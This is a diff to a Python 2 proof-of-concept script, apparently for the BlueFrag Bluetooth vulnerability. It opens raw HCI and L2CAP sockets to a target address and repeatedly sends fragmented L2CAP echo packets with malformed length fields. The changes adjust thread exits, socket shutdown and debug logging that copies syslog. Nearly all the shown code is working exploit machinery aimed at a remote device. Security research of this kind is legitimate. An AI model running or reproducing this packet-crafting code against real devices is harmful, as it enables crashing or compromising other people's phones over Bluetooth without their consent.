@@ -7,27 +7,29 @@ import time
 from binascii import hexlify, unhexlify
 from thread import start_new_thread
 from thread import get_ident
+from thread import exit
 from random import randint, randrange
 
+echo = False
 def recv_l2cap():
     global l2cap
     global echo
-    global pid_l2cap
-    pid_l2cap = get_ident()
     while True:
         pkt = l2cap.recv(1024)
         if ord(pkt[0]) == 0x9: #ECHO RESP
             echo = True
             print "ECHO", hexlify(pkt)
+            exit()
         else:
             print hexlify(pkt)
 
 handle = 0 #coonection handle
 def recv_hci():
     global handle
-    global pid_hci
-    pid_hci = get_ident()
+    global echo
     while True:
+    	if echo:
+    		exit()
         pkt = hci.recv(1024)
         if ord(pkt[0]) == 0x04 and ord(pkt[1]) == 0x03:
             if handle == 0:
@@ -36,24 +38,13 @@ def recv_hci():
 
             print "HCI", hexlify(pkt)
 
-#print "Parse proccess Id"
-#a = raw_input()
-
 hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
 hci.setsockopt(socket.SOL_HCI, socket.HCI_DATA_DIR,1)
 hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00')
 hci.bind((0,))
-pid_hci = 0
 start_new_thread(recv_hci, ())
 
-#l2cap.listen(0)
-#conn, addr = 0, 0
-#conn, addr = l2cap.accept()
-#print "Connection: ", conn
-#print "Address: ", addr
-
 connect_response = -1
-pid_l2cap = 0
 while connect_response != 0:
     l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
     connect_response = l2cap.connect_ex((sys.argv[1], 0))
@@ -92,7 +83,6 @@ else:
 #a = raw_input("Check socket")
 send_echo_hci(0, "A"*(32))
 i = 1
-echo = False
 while not echo:
     send_echo_hci(i  , "A"*(dst_l), l2cap_len_adj=2)
     send_echo_hci(i+1, "A"*(src_l), continuation_flags=1)
@@ -109,8 +99,9 @@ if len(sys.argv) > 4:
 	os.system("bluetoothctl devices > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-bluetoothctl-devices.txt")
 	os.system("bluetoothctl info 80:1D:00:33:D8:82 > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-bluetoothctl-info.txt")
 	os.system("sudo cat /var/log/syslog > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-syslog.txt")
+l2cap.shutdown(3)
 l2cap.close()
 hci.close()
-time.sleep(2)
+time.sleep(1)
 #raw_input("Done")
 
